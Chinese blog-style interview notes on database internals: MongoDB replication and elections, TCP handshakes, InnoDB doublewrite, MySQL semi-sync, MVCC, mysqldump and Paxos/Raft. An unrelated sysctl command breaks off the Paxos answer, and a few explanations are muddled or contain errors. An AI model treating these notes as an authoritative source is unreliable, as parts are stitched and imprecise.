Delayed节点必须是Hidden节点，并且其数据落后与Primary一段时间（可配置，比如1个小时）。 因Delayed节点的数据比Primary落后一段时间，当错误或者无效的数据写入Primary时，可通过Delayed节点的数据来恢复到之前的时间点。 数据同步 Primary与Secondary之间通过oplog来同步数据，Primary上的写操作完成后，会向特殊的local.oplog.rs特殊集合写入一条oplog，Secondary不断的从Primary取新的oplog并应用。 因oplog的数据会不断增加，local.oplog.rs被设置成为一个capped集合，当容量达到配置上限时，会将最旧的数据删除掉。另外考虑到oplog在Secondary上可能重复应用，oplog必须具有幂等性，即重复应用也会得到相同的结果。 oplog里各个字段的含义如下 ts： 操作时间，当前timestamp + 计数器，计数器每秒都被重置 h：操作的全局唯一标识 v：oplog版本信息 op：操作类型 i：插入操作 u：更新操作 d：删除操作 c：执行命令（如createDatabase，dropDatabase） n：空操作，特殊用途 ns：操作针对的集合 o：操作内容，如果是更新操作 o2：操作查询条件，仅update操作包含该字段Secondary初次同步数据时，会先进行init sync，从Primary（或其他数据更新的Secondary）同步全量数据，然后不断通过tailable cursor从Primary的local.oplog.rs集合里查询最新的oplog并应用到自身。 T1时间，从Primary同步所有数据库的数据（local除外），通过listDatabases + listCollections + cloneCollection敏命令组合完成，假设T2时间完成所有操作。 从Primary应用[T1-T2]时间段内的所有oplog，可能部分操作已经包含在步骤1，但由于oplog的幂等性，可重复应用。 根据Primary各集合的index设置，在Secondary上为相应集合创建index。（每个集合_id的index已在步骤1中完成）。 oplog集合的大小应根据DB规模及应用写入需求合理配置，配置得太大，会造成存储空间的浪费；配置得太小，可能造成Secondary的init sync一直无法成功。比如在步骤1里由于DB数据太多、并且oplog配置太小，导致oplog不足以存储[T1, T2]时间内的所有oplog，这就Secondary无法从Primary上同步完整的数据集。细说Primary选举Primary选举除了在复制集初始化时发生，还有如下场景 复制集被reconfig Secondary节点检测到Primary宕机时，会触发新Primary的选举 当有Primary节点主动stepDown（主动降级为Secondary）时，也会触发新的Primary选举Primary的选举受节点间心跳、优先级、最新的oplog时间等多种因素影响。节点间心跳复制集成员间默认每2s会发送一次心跳信息，如果10s未收到某个节点的心跳，则认为该节点已宕机；如果宕机的节点为Primary，Secondary（前提是可被选为Primary）会发起新的Primary选举。节点优先级 每个节点都倾向于投票给优先级最高的节点 优先级为0的节点不会主动发起Primary选举 当Primary发现有优先级更高Secondary，并且该Secondary的数据落后在10s内，则Primary会主动降级，让优先级更高的Secondary有成为Primary的机会。Optime 拥有最新optime（最近一条oplog的时间戳）的节点才能被选为主。 网络分区 只有更大多数投票节点间保持网络连通，才有机会被选Primary；如果Primary与大多数的节点断开连接，Primary会主动降级为Secondary。当发生网络分区时，可能在短时间内出现多个Primary，故Driver在写入时，最好设置『大多数成功』的策略，这样即使出现多个Primary，也只有一个Primary能成功写入大多数。 说说TCP协议流程答： 字段 含义 URG 紧急指针是否有效。为1，表示某一位需要被优先处理 ACK 确认号是否有效，一般置为1。 PSH 提示接收端应用程序立即从TCP缓冲区把数据读走。 RST 对方要求重新建立连接，复位。 SYN 请求建立连接，并在其序列号的字段进行序列号的初始值设定。建立连接，设置为1 FIN 希望断开连接。 TCP 握手 第一次握手 客户端发送数据包到服务器,(在此连接请求报文段中的同步位SYN=1,确认ACK=0,表示这是一个TCP连接请求数据报文,序号seq=x,表示传输数据时的起始序号是x)此时,客户端进入SYN_SENT状态,等待服务器确认 第二次握手 服务器收到连接请求报文段后，若同意建立连接,则向客户端发送确认报文段。此时服务器进入SYN_RECV状态。（其中确认报文段中，标识位SYN=1，ACK=1，表示这是一个TCP连接响应数据报文，并含服务端的初始序号seq(服务器)=y，以及服务器对客户端初始序号的确认号ack(服务器)=seq(客户端)+1=x+1）。 第三次握手 客户端再次向服务器发送一个序列号(seq=x+1)，确认号为ack(客户端)=y+1，此包发送完毕，客户端和服务器进入ESTAB_LISHED(TCP连接成功)状态，完成三次握手。 TCP释放 第一次挥手 首先，客户端发送一个FIN，用来关闭客户端到服务器的数据传送，然后等待服务器的确认。其中终止标志位FIN=1，序列号seq=u。 第二次挥手 服务器收到这个FIN，它发送一个ACK，确认ack为收到的序号加一。 第三次挥手 关闭服务器到客户端的连接，发送一个FIN给客户端。 第四次挥手 客户端收到FIN后，并发回一个ACK报文确认，并将确认序号seq设置为收到序号加一。首先进行关闭的一方将执行主动关闭，而另一方执行被动关闭。 TCP 挥手总结客户端发送FIN后，进入终止等待状态，服务器收到客户端连接释放报文段后，就立即给客户端发送确认，服务器就进入CLOSE_WAIT状态，此时TCP服务器进程就通知高层应用进程，因而从客户端到服务器的连接就释放了。此时是“半关闭状态”，即客户端不可以发送给服务器，服务器可以发送给客户端。此时，如果服务器没有数据报发送给客户端，其应用程序就通知TCP释放连接，然后发送给客户端连接释放数据报，并等待确认。客户端发送确认后，进入TIME_WAIT状态，但是此时TCP连接还没有释放，然后经过等待计时器设置的2MSL后，才进入到CLOSE状态。 MySQL的 Double Writer(双写)是什么？答：有一个double write buffer，大小为2M。另一部分是物理磁盘上ibdata系统表空间中大小为2MB，共128个连续的Page，既2个分区。其中120个用于批量写脏，另外8个用于Single Page Flush。做区分的原因是批量刷脏是后台线程做的，不影响前台线程。而Single page flush是用户线程发起的，需要尽快的刷脏并替换出一个空闲页出来。对于批量刷脏，每次找到一个可做flush的page，对其持有S lock，然后将该page拷贝到dblwr中，当dblwr满后者一次批量刷脏结束时，将dblwr中的page全部刷到ibdata中，注意这是同步写操作；然后再唤醒后台IO线程去写数据页。当后台IO线程完成写操作后，会去更新dblwr中的计数以腾出空间，释放block上的S锁，完成写入。 对于Single Page Flush，则做的是同步写操作，在挑出一个可以刷脏的page后，先加入到dblwr中，刷到ibdata，然后写到用户表空间，完成后，会对该用户表空间做一次fsync操作。 Single Page Flush在buffer pool中free page不够时触发，通常由前台线程发起，由于每次single page flush都会导致一次fsync操作，在大并发负载下，如果大量线程去做flush，很显然会产生严重的性能下降。Percona在5.6版本中做了优化，可以选择由后台线程lru manager来做预刷，避免用户线程陷入其中。 如果发生了极端情况（断电）Crash Recovery，InnoDB再次启动后，发现了一个Page数据已经损坏，那么此时就可以从double write buffer中进行数据恢复了。触发数据缓冲池中的脏页进行刷新到data file的时候，并不直接写磁盘，而是会通过memcpy函数将脏页先复制到内存中的double write buffer，之后通过double write buffer再分两次、每次1MB顺序写入共享表空间的物理磁盘上。然后马上调用fsync函数，同步脏页进磁盘上。由于在这个过程中，double write页的存储时连续的，因此写入磁盘为顺序写，性能很高；完成double write后，再将脏页写入实际的各个表空间文件。 MySQL 半同步中5.7比5.6的优点是那些呢？答：半同步复制，普通的replication，即mysql的异步复制，依靠mysql二进制日志也即binary log进行数据复制。比如两台机器，一台主机(master)，另外一台是从机(slave)。 正常的复制为：事务一（t1）写入binlog buffer；dumper 线程通知slave有新的事务t1；binlog buffer 进行checkpoint；slave的io线程接收到t1并写入到自己的的relay log；slave的sql线程写入到本地数据库。 这时，master和slave都能看到这条新的事务，即使master挂了，slave可以提升为新的master。 异常的复制为：事务一（t1）写入binlog buffer；dumper 线程通知slave有新的事务t1；binlog buffer 进行checkpoint；slave因为网络不稳定，一直没有收到t1；master 挂掉，slave提升为新的master，t1丢失。 很大的问题是：主机和从机事务更新的不同步，就算是没有网络或者其他系统的异常，当业务并发上来时，slave因为要顺序执行master批量事务，导致很大的延迟。 为了弥补以上几种场景的不足，mysql从5.5开始推出了半同步。即在master的dumper线程通知slave后，增加了一个ack，即是否成功收到t1的标志码。也就是dumper线程除了发送t1到slave，还承担了接收slave的ack工作。如果出现异常，没有收到ack，那么将自动降级为普通的复制，直到异常修复。 我们可以看到半同步带来的新问题： 如果异常发生，会降级为普通的复制。 那么从机出现数据不一致的几率会减少，并不是完全消失。 主机dumper线程承担的工作变多了，这样显然会降低整个数据库的性能。 在MySQL 5.5和5.6使用after_commit的模式下, 即如果slave 没有收到事务，也就是还没有写入到relay log 之前，网络出现异常或者不稳定，此时刚好master挂了，系统切换到从机，两边的数据就会出现不一致。 在此情况下，slave会少一个事务的数据。 MySQL 5.7 主从一致性加强，支持在事务commit前等待ACK新版本的semi sync 增加了rpl_semi_sync_master_wait_point= AFTER_SYNC;参数, 来控制半同步模式下主库在返回给会话事务成功之前提交事务的方式。该参数有两个值:12AFTER_COMMIT: master将每个事务写入binlog ,传递到slave 刷新到磁盘(relay log)，同时主库提交事务。master等待slave 反馈收到relay log，只有收到ACK后master才将commit OK结果反馈给客户端。AFTER_SYNC(5.7独有): master 将每个事务写入binlog , 传递到slave 刷新到磁盘(relay log)。master等待slave 反馈接收到relay log的ack之后，再提交事务并且返回commit OK结果给客户端。 即使主库crash，所有在主库上已经提交的事务都能保证已经同步到slave的relay log中。 支持发送binlog和接受ACK的异步化 旧版本的semi sync 受限于dump thread ，原因是dump thread 承担了两份不同且又十分频繁的任务：传送binlog 给slave ，还需要等待slave反馈信息，而且这两个任务是串行的，dump thread 必须等待 slave 返回之后才会传送下一个 events 事务。dump thread 已然成为整个半同步提高性能的瓶颈。在高并发业务场景下，这样的机制会影响数据库整体的TPS 。 without_ack_receiving_thread 为了解决上述问题，在5.7版本的semi sync 框架中，独立出一个 ack collector thread ，专门用于接收slave 的反馈信息。这样master 上有两个线程独立工作，可以同时发送binlog 到slave ，和接收slave的反馈。 控制主库接受SLAVE写事务成功反馈数量。 MySQL 5.7 新增了SET GLOBAL rpl_semi_sync_master_wait_for_slave_count= N;参数，可以用来控制主库接受多少个slave写事务成功反馈，给高可用架构切换提供了灵活性。当count值为2时，master需等待两个slave的ack。 Binlog 互斥锁改进 旧版本半同步复制在主提交binlog的写会话和dump thread读binlog的操作都会对binlog添加互斥锁，导致binlog文件的读写是串行化的，存在并发度的问题。 binlog_mutex_after_tuning MySQL 5.7 对binlog lock进行了以下两方面优化: 移除了dump thread对binlog的互斥锁 加入了安全边际保证binlog的读安全 组提交 MySQL 5.7 引入了新的变量slave-parallel-type，其可以配置的值有: DATABASE （5.7之前默认值），基于库的并行复制方式 LOGICAL_CLOCK （5.7新增值），基于组提交的并行复制方式； MySQL的RPO 和 RTO 名词是什么意思？答：RPO: 恢复点目标 恢复点目标是指企业的损失容限：在对业务造成重大损害之前可能丢失的数据量。该目标表示为从丢失事件到最近一次在前备份的时间度量。RTO: 恢复时间目标 RTO指的是应用程序可以中断或关闭多少时间而不会对业务造成重大损害。有些应用程序可能会停机数天而不会产生严重的后果。而一些高优先级的应用程序只能停下来几秒钟，否则将会让企业和客户难以应对，并导致业务丢失。 比如一个操作，Begin;insert into….; commit; 这么操作。TPS 是几？QPS 是几?答：我理解的是QPS中包含TPS，所以QPS 是3，TPS 是1. InnoDB的 MVCC 和 READ VIEW 给我讲解下？答：MVCC 是multiversion concurrency control的简称，也就是多版本并发控制，是个很基本的概念。MVCC的作用是让事务在并行发生时，在一定隔离级别前提下，可以保证在某个事务中能实现一致性读，也就是该事务启动时根据某个条件读取到的数据，直到事务结束时，再次执行相同条件，还是读到同一份数据，不会发生变化（不会看到被其他并行事务修改的数据）。read view InnoDB MVCC使用的内部快照的意思。在不同的隔离级别下，事务启动时（有些情况下，可能是SQL语句开始时）看到的数据快照版本可能也不同。在RR、RC、RU（READ UNCOMMITTED）等几个隔离级别下会用到 read view。何时创建read view 其实，我们从上面的解释已经明白了，在RC隔离级别下，是每个SELECT都会获取最新的read view；而在RR隔离级别下，则是当事务中的第一个SELECT请求才创建read viewMySQL mysqldump 实现的原理是什么样子的？答： FLUSH /!40101 LOCAL / TABLES FLUSH TABLES WITH READ LOCK 执行flush tables操作，并加一个全局读锁，很多童鞋可能会好奇，这两个命令貌似是重复的，为什么不在第一次执行flush tables操作的时候加上锁了，其实，这样做的原因在于可以尽量减少加锁的影响。加上全局读锁，只允许读，不允许更新操作。 SET SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ 设置当前会话的事务隔离等级为RR，RR可避免不可重复读和幻读。 START TRANSACTION /!40100 WITH CONSISTENT SNAPSHOT / 获取当前数据库的快照，这个是由mysqldump中–single-transaction决定的。 这个只适用于支持事务的表，在MySQL中，只有Innodb。 注意：START TRANSACTION 和 START TRANSACTION WITH CONSISTENT SNAPSHOT 并不一样， START TRANSACTION WITH CONSISTENT SNAPSHOT 是开启事务的一致性快照。 RC 下的 START TRANSACTION WITH CONSISTENT SNAPSHOT 相当于RR下的START TRANSACTION。 不明白事务的童鞋可能觉得这点会比较绕，其实所谓的不可重复读和幻读可简单理解为，在同一个事务内，两次SELECT的结果并不相同。 之所以要使用START TRANSACTION WITH CONSISTENT SNAPSHOT，因为每个表的备份时间并不相同，这就要求在对第一张表进行备份的期间，对第二个表进行的操作，并不会反映到第二张表开始备份时执行的SELECT操作中。（注：mysqldump备份的底层实现即是select * from tab）。而这用START TRANSACTION就无法实现。 SHOW MASTER STATUS 这个是由–master-data决定的，记录了开始备份时，binlog的状态信息，包括MASTER_LOG_FILE和MASTER_LOG_POS UNLOCK TABLES 等记录完成后，就立即释放了，因为现在已经在一个事务中了，其他线程再修改数据已经无所谓，在本线程中已经是可重复读，这也是这一步必须在19 rows之后的原因，如果20 rows和21 rows都在19 rows之前的话就不行了，因为这时事务还没开启，一旦释放，其他线程立即就可以更改数据，从而无法保证得到事务开启时最准确的pos点 备份的核心是SELECT /!40001 SQL_NO_CACHE / * FROM test1语句。 该语句会查询到表test1的所有数据，在备份文件中会生成相应的insert语句。 其中SQL_NO_CACHE的作用是查询的结果并不会缓存到查询缓存中。 SHOW CREATE DATABASE IF NOT EXISTS test，show create table test1 生成创库语句和创表语句。 SHOW TRIGGERS LIKE ‘test1’ 可以看出，如果不加-R参数，默认是会备份触发器的。 SHOW FUNCTION STATUS WHERE Db = ‘test’SHOW CREATE FUNCTION mycat_seq_currvalSHOW PROCEDURE STATUS WHERE Db = ‘test’ 用于备份存储过程和函数。 设置SAVEPOINT，然后备份完每个表后再回滚到该SAVEPOINT。因为前面通过START TRANSACTION WITH CONSISTENT SNAPSHOT开启的事务只能通过commit或者rollback来结束，而不是ROLLBACK TO SAVEPOINT sp。PS：这样做不会阻塞在备份期间对已经备份表的ddl操作，具体可见下面的“后续补充”第三点。 总结： mysqldump的本质是通过select * from tab来获取表的数据的。 START TRANSACTION /!40100 WITH CONSISTENT SNAPSHOT /必须放到FLUSH TABLES WITH READ LOCK和UNLOCK TABLES之间，放到之前会造成START TRANSACTION /!40100 WITH CONSISTENT SNAPSHOT /和FLUSH TABLES WITH READ LOCK之间执行的DML语句丢失，放到之后，会造成从库重复插入数据。 mysqldump只适合放到业务低峰期做，如果备份的过程中数据操作很频繁，会造成Undo表空间越来越大，undo表空间默认是放到共享表空间中的，而ibdata的特性是一旦增大，就不会收缩。 mysqldump的效率还是比较低下，START TRANSACTION /!40100 WITH CONSISTENT SNAPSHOT /只能等到所有表备份完后才结束，其实效率比较高的做法是备份完一张表就提交一次，这样可尽快释放Undo表空间快照占用的空间。但这样做，就无法实现对所有表的一致性备份。 mysqldump single-transaction怎么实现获取InnoDB表的一致性备份？答： SET SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ 批注：–single-transaction参数的作用，设置事务的隔离级别为可重复读，即REPEATABLE READ，这样能保证在一个事务中所有相同的查询读取到同样的数据，也就大概保证了在dump期间，如果其他innodb引擎的线程修改了表的数据并提交，对该dump线程的数据并无影响，然而这个还不够，还需要看下一条 START TRANSACTION /!40100 WITH CONSISTENT SNAPSHOT / 这时开启一个事务，并且设置WITH CONSISTENT SNAPSHOT为快照级别（如果mysql版本高于某一个版本值，我还不大清楚40100代表什么版本）。想象一下，如果只是可重复读，那么在事务开始时还没dump数据时，这时其他线程修改并提交了数据，那么这时第一次查询得到的结果是其他线程提交后的结果，而WITH CONSISTENT SNAPSHOT能够保证在事务开启的时候，第一次查询的结果就是事务开始时的数据A，即使这时其他线程将其数据修改为B，查的结果依然是A Paxos协议和Raft协议答：在分布式中我们非常非常看重的有一般网上经常说的三个点，CAP ！即：C (Consistency 一致性)、A (Availability 可用性)、P (Partition)；也就是我们经常所说的【CAP原理】；而在一致性中我们有非常非常注重四个点， ACID ！ 即：A (Atomicity 原子性)、C (Consistency 一致性)、 I (Isolation 隔离性)、 D (Durability 持久性)，也就是我们常说的【ACID原则】是的一致性原则中的一种 RaftRaft是一个分布式一致性协议／算法，是Replicated And Fault Tolerant的缩写。在raft中首先具备了三种角色： Leader (领导者) Candidate（候选者） Follower（追随者） 通常再做决策之前需要选举出一个全局的Leader来简化后续的决策过程。Leader决定了log的提交，且 log只能是Leader 想follower单向提交。 Leader (领导者)：负责接收客户端的Log，并分发给其他节点。 Candidate （候选者）：发起选举请求，竞争Leader。 Follower （追随者）：负责接收Leader发送过来的Log，并刷新保存。 Raft 分为两个过程: 选举Leader 日志同步。 Raft的核心思想 Leader的选举过程 Log的复制方案 数据安全（其实就是一致性） Paxos（Lamport）：分布式系统中的节点通信存在两种模型：共享内存（Shared memory）和消息传递（Messages passing）。 基于消息传递通信模型的分布式系统，不可避免的会发生以下错误：进程可能会慢、被杀死或者重启，消息可能会延迟、丢失、重复，在基础Paxos场景中，先不考虑可能出现消息篡改即拜占庭错误的情况。 Paxos算法解决的问题是在一个可能发生上述异常的分布式系统中如何就某个值达成一致，保证不论发生以上任何异常，都不会破坏决议的一致性。 主要有三类节点: 提议者（Proposer）：提出提案等待大家认可该提案为决议。(系统中的提案都拥有一个自增的唯一提案号，) 接受者（Acceptor）：负责对提案进行投票，认可提案。 学习者（Learner）：获取批准的结果 （学习acceptor所认可的结果），并帮忙传播，不参与投票过程。 Paxos的流程分为两个阶段: 准备阶段 提交阶段 准备阶段： proposer向网络内超过半数的acceptor发送prepare消息 (即：提交自己的提案编号) acceptor正常情况下回复promise消息（接受者时可保存收到过的提案的最大编号和认可的最大提案，如果收到的提案号比自己保留的最大提案号还大，则返回自己已认可的提案号；如果从未认可过提案，则返回空，并更新当前保存的最大提案号，并说明不再认可小于最大提案号的提案） 提交阶段： 在有足够多acceptor回复promise消息时，proposer发送accept消息（如果提案者收到大多数的回复，则发送带有刚才提案号的接受 accept 信息。 /proc/sys/net/ipv4/ip_forward# sed -i '/net.ipv4.ip_forward/ s/\(.*= \).*/\11/' /etc/sysctl.conf 在InnoDB引擎中，16k PAGE SIZE, InnoDB的非叶子节点最多能放多少个INT的Primary Keys,能用 16K/4 来估算吗？答：在InnoDB引擎中，每一个page预留1/6空闲空间，再减去头尾元数据信息，就是 16338*15/16*1024/4。就是大概的结果。注: 16338 是去掉 头尾元数据信息后的大小。 参考官方资料 说一说三个范式答：第一范式(1NF): 数据库表中的字段都是单一属性的,不可再分. 这个单一属性由基本类型构成, 包括整型/实数/字符型/逻辑性/日期型等. 第二范式(2NF): 数据库表中不存在非关键字段对任一候选关键字段的部分函数依赖(部分函数依赖指的是存在组合关键字段中的某些字段决定非关键字段的情况), 也即所有非关键字段都完全依赖于任意一组候选关键字. 第三范式(3NF): 在第二范式的基础上，数据表中如果不存在非关键字段对任一候选关键字段的传递函数依赖则符合第三范式. 所谓传递函数依赖, 指的是如果存在 ‘A -> B -> C’ 的决定关系, 则C传递函数依赖于A. 因此, 满足第三范式的数据库表应该不存在如下依赖关系: 关键字段 -> 非关键字段x -> 非关键字段y document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>MySQL 面试笔记</category>
      </categories>
      <tags>
        <tag>MySQL 面试笔记</tag>
      </tags>
  </entry>
</search>
